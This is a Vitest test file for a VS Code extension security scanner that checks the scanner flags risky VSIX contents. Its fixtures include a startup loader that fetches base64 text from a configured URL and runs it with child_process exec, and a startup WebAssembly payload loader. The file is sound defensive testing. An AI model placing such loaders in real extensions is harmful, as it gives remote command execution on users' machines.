import { describe, expect, test } from "vitest";
import {
  buildVscodeReleaseManifest,
  createVscodeExtensionReview,
  VSCODE_RULE_IDS,
} from "../server/lib/adapters/vscode/index";

const SHA = "ab".repeat(32);

function file(path, textSample) {
  return {
    path,
    size: textSample.length,
    sha256: "00",
    flags: [],
    textSample,
  };
}

function binary(path, size) {
  return {
    path,
    size,
    sha256: "00",
    flags: ["binary"],
  };
}

function artifact(files) {
  return {
    path: "dist/remote-text-fetcher-1.0.0.vsix",
    sha256: SHA,
    files,
  };
}

function extensionPackageJson(overrides = {}) {
  return JSON.stringify(
    {
      name: "remote-text-fetcher",
      publisher: "example",
      version: "1.0.0",
      engines: { vscode: "^1.80.0" },
      main: "./out/extension",
      activationEvents: ["onStartupFinished"],
      contributes: {
        configuration: {
          properties: {
            "remoteTextFetcher.url": {
              type: "string",
            },
          },
        },
      },
      ...overrides,
    },
    null,
    2,
  );
}

describe("VS Code extension review adapter", () => {
  test("detects startup remote command loader behavior in a VSIX", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file(
          "extension/out/extension.js",
          [
            "const vscode = require('vscode');",
            "const https = require('https');",
            "const { exec } = require('child_process');",
            "function activate() {",
            "  const url = vscode.workspace.getConfiguration('agentService').get('url');",
            "  https.get(url, res => res.on('data', chunk => {",
            "    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
            "    exec(cmd);",
            "  }));",
            "}",
          ].join("\n"),
        ),
      ]),
    });

    const ruleIds = review.ruleFindings.map((finding) => finding.ruleId).sort();
    expect(ruleIds).toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.startupRemoteCommand,
        VSCODE_RULE_IDS.undeclaredConfigurationRead,
        "code.process-execution",
        "code.network-access",
        "code.dynamic-evaluation",
      ]),
    );
    expect(review.risk).toBe("critical");
    expect(review.package).toEqual({ name: "example.remote-text-fetcher", version: "1.0.0" });
  });

  test("detects startup WebAssembly loaders in a VSIX", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file(
          "extension/out/extension.js",
          [
            "const go = new Go();",
            "async function activate() {",
            "  const source = await WebAssembly.instantiateStreaming(fetch('./payload.wasm'), go.importObject);",
            "  go.run(source.instance);",
            "}",
          ].join("\n"),
        ),
        binary("extension/out/payload.wasm", 824552),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.startupWasmLoader,
        "code.dynamic-evaluation",
        "file.native-artifact",
      ]),
    );
    expect(review.risk).toBe("critical");
  });

  test("allows declared configuration reads and narrow activation", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            activationEvents: ["onCommand:remoteTextFetcher.run"],
          }),
        ),
        file(
          "extension/out/extension.js",
          "const vscode = require('vscode'); vscode.workspace.getConfiguration('remoteTextFetcher').get('url');",
        ),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).not.toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.undeclaredConfigurationRead,
      ]),
    );
  });
});
